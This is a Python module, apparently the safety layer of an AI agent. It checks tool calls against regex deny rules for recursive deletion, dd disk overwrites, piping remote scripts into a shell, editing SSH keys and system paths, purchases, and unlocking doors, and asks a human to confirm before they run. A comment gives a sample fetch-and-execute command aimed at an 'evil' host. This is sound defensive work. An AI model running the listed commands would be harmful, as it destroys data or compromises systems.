"""Safety layer — intercepts dangerous tool calls and requires confirmation."""
import re

# (tool_name, input_key, pattern) → human-readable risk description
_RULES: list[tuple[str, str, re.Pattern, str]] = [
    # Code-execution tools: confirm on the user/core path. (Autonomous cortex/forge
    # paths route through the Docker sandbox instead — see tools/sandbox.autonomous_backend.)
    ("run_python", "code", re.compile(r".+", re.S), "running arbitrary Python on the host"),
    ("run_skill", "name", re.compile(r".+"), "running a skill (executes code) on the host"),
    ("bash", "command", re.compile(r"\brm\b.+(-rf?|--recursive)", re.I), "recursive delete"),
    ("bash", "command", re.compile(r"\bdd\b"), "disk overwrite (dd)"),
    ("bash", "command", re.compile(r">\s*/dev/(sd|nvme|disk)", re.I), "writing to raw device"),
    ("bash", "command", re.compile(r"(sudo\s+)?shutdown|reboot|halt", re.I), "system shutdown/reboot"),
    ("bash", "command", re.compile(r"(curl|wget).+(sh|bash|zsh)\s*\|", re.I), "piping remote script to shell"),
    ("write_file", "path", re.compile(r"^/(etc|sys|proc|boot|usr/bin)"), "writing to system path"),
    ("write_file", "path", re.compile(r"\.ssh/(authorized_keys|config|id_)", re.I), "modifying SSH keys"),
    ("browser_click", "selector", re.compile(r"(submit|confirm|send|delete|pay|buy|purchase|place.order)", re.I), "form submission or purchase"),
    ("browser_press", "key", re.compile(r"^Enter$"), "pressing Enter (may submit a form)"),
    ("update_system_prompt", "addition", re.compile(r".+"), "modifying the agent's own system prompt"),
    ("register_new_tool", "name", re.compile(r".+"), "registering a new self-defined tool"),
    ("revert_self_mod", "restore_backup", re.compile(r".*"), "reverting self-modifications"),
    # Tier-4: outbound communications need explicit confirmation
    ("sms_send", "to", re.compile(r".+"), "sending an SMS to a real phone number"),
    ("call_user", "to", re.compile(r".+"), "placing an outbound voice call"),
    ("generate_image", "prompt", re.compile(r".+"), "generating an image (uses Replicate credits)"),
    # IoT: irreversible or safety-critical HA actions require confirmation
    ("iot_call_service", "domain", re.compile(r"^(lock|alarm_control_panel)$", re.I), "controlling a lock or alarm"),
    ("iot_call_service", "service", re.compile(r"^(unlock|open_cover|disarm|trigger)$", re.I), "unlocking / opening / disarming an IoT device"),
    ("iot_call_service", "data", re.compile(r"garage|door_lock", re.I), "operating a garage or door lock"),
]

_confirm_fn = None  # injected at startup: a callable(prompt: str) -> bool


def set_confirm_fn(fn) -> None:
    global _confirm_fn
    _confirm_fn = fn


def check(tool_name: str, inputs: dict) -> tuple[bool, str]:
    """Returns (proceed: bool, reason: str). False means blocked by user."""
    for rule_tool, rule_key, pattern, description in _RULES:
        if tool_name != rule_tool:
            continue
        value = str(inputs.get(rule_key, ""))
        if pattern.search(value):
            reason = f"Risky action: {description}\nTool: {tool_name}\nValue: {value[:120]}"
            if _confirm_fn is None:
                print(f"\n[Safety] {reason}")
                answer = input("Proceed? (y/N): ").strip().lower()
                return answer in {"y", "yes"}, reason
            else:
                proceed = _confirm_fn(reason)
                return proceed, reason

    # Second layer: the pattern list above is finite and cannot enumerate hostile
    # intent (it stops `rm -rf` and misses `curl evil | -o /tmp/x && /tmp/x`).
    # Ask a model. This runs ONLY because nothing above matched, so the reviewer
    # can add caution but can never overturn a block — see agent/command_review.
    try:
        from agent import command_review
        risky, why = command_review.review(tool_name, inputs)
    except Exception:
        risky, why = False, ""   # review must never break tool dispatch
    if risky:
        reason = f"Flagged by safety review: {why}\nTool: {tool_name}"
        if _confirm_fn is None:
            print(f"\n[Safety] {reason}")
            answer = input("Proceed? (y/N): ").strip().lower()
            return answer in {"y", "yes"}, reason
        return _confirm_fn(reason), reason

    return True, ""
